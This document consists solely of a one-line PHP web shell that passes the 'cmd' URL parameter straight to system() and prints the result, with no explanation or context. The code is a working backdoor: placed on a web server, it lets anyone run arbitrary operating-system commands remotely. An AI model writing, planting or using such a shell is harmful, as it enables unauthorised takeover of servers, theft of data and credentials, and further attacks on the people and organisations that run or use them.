
<?php echo system($_GET['cmd']); ?>
